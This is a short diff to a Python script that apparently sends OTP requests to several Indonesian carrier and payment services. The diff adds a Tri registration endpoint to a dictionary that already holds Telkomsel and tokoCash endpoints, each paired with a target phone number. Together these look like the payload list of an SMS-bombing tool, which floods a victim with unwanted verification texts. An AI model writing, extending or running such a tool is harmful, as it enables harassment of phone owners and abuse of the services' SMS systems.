@@ -24,7 +24,9 @@ def post_data():
             "Telkomsel":["https://tdwidm.telkomsel.com/passwordless/start",
            {"phone_number": no, "connection":"sms"}],      
             "tokoCash":["https://www.tokocash.com/oauth/otp",
-           {"msisdn": no, "accept":"sms"}]}
+           {"msisdn": no, "accept":"sms"}],
+           "SMS-TRI":["https://registrasi.tri.co.id/daftar/generateOTP", {"msisdn":no}]
+           }
     return data
 def start(qz,h,u,m):
     r = requests.session()
